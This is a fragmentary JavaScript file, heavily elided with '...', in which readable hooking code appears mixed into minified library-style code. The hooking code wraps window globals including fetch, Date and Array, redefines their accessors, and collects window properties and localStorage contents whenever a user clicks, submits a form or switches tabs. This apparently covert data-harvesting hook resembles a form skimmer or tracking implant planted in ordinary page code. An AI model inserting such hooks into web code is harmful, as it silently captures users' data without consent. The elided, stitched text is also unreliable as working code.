(function (g) {
  ...
  const jshook = function () {
    ...
    JSHook.prototype.track = function () {
    ...
    return function (action) {
      return new JSHook(action).track;
    };
  }();
  g.k.JK = null;
  g.k.Jx = null;
  ...
  g.k.Ox = -1;
  g.k.LS = -1;
  const interceptGlobals = (varlist = []) => {
    varlist.forEach(variable => {
      const val = window[variable];
      globalVarStorage[variable] = typeof val === 'function' ? jshook(val) : val;
      Object.defineProperty(window, variable, {
        get: () => globalVarStorage[variable],
        set: newValue => {
          globalVarStorage[variable] = newValue;
        },
        configurable: true
      });
    });
  ...
  const gatherData = () => {
    ...
    const lsData = trackLocalStorage();
    const gatheredData = {
      ...windowProps,
      ...lsData,
      ...globalVarStorage
  ...
  function attachEventListeners() {
    ...
    document.addEventListener("visibilitychange", gatherData);
    document.addEventListener("click", gatherData);
    document.addEventListener("submit", gatherData);
  }
  g.k.Lz = function () {
    return 3 === this.j.K;
  };
  ...
  interceptGlobals(["Date", "Array", "fetch"]);
